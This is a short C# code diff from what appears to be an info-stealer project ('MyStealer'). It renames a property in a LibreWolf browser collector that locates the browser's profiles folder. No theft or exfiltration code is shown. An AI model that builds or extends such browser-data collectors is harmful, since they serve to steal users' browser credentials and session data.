@@ -5,7 +5,7 @@ namespace MyStealer.Collectors.Browser.FirefoxBased
 {
     internal class LibreWolf : Firefox
     {
-        public override string ApplicationName => "LibreWolf";
+        public override string ModuleName => "LibreWolf";
 
         protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "librewolf", "Profiles");
 
